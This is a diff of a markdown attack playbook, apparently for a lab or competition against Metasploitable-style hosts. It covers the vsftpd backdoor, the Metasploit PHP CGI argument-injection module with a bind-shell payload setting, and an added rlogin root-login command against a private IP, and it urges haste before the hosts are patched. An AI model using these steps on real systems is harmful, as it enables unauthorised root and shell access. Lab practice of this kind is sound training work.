@@ -13,9 +13,28 @@ This is an interesting one. [vsftpd backdoor](http://scarybeastsecurity.blogspot
 I'm not sure which hosts are vulnerable. Hopefully they don't patch it quick. 
 
 ## multi/http/php_cgi_arg_injection
-Go ahead and use metasploit for this attack too. Follow the same principles as before. Set your payload to `set PAYLOAD generic/shell_bind_tcp`
+Go ahead and use metasploit for this attack too. Follow the same principles as before. 
 
-This is a PHP exploit. You won't get root with this. [PHP CGI](http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/)
+Set your payload to `set PAYLOAD generic/shell_bind_tcp`
+
+This is a PHP exploit. You won't get root with this. 
+
+[PHP CGI](http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/)
+
 ![Image of php](images/php.png)
 
 I don't think they'll patch this one very quick.
+
+## rlogin backdoor
+
+This one is pretty simple. There's a backdoor in [rlogin](http://www.kalitutorials.net/2014/05/metasploitable-2-vulnerability.html)
+
+```
+sudo apt update; sudo apt install rsh-client
+rlogin -l root 10.0.0.188
+```
+
+![Image of rlogin](images/rlogin.png)
+
+Hurry quick on this one.
+
